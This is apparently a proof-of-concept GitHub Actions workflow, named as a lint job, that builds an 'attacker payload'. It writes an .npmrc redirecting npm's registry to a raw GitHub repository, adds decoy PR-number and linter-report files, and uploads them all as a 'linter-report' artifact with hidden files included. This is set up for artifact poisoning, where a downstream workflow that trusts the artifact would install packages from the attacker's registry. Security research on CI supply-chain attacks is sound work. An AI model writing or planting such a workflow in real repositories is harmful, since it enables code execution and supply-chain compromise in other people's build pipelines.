name: ADP Lint Up
on:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Build attacker payload with .npmrc registry redirect
        run: |
          mkdir -p /tmp/root
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg2/\naudit=false\nfund=false\nprogress=false\n' > /tmp/root/.npmrc
          printf '42\n' > /tmp/root/pr-number.txt
          printf 'hello\n' > /tmp/root/linter-report.txt
          ls -la /tmp/root
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            /tmp/root/.npmrc
            /tmp/root/pr-number.txt
            /tmp/root/linter-report.txt
          include-hidden-files: true
          if-no-files-found: ignore
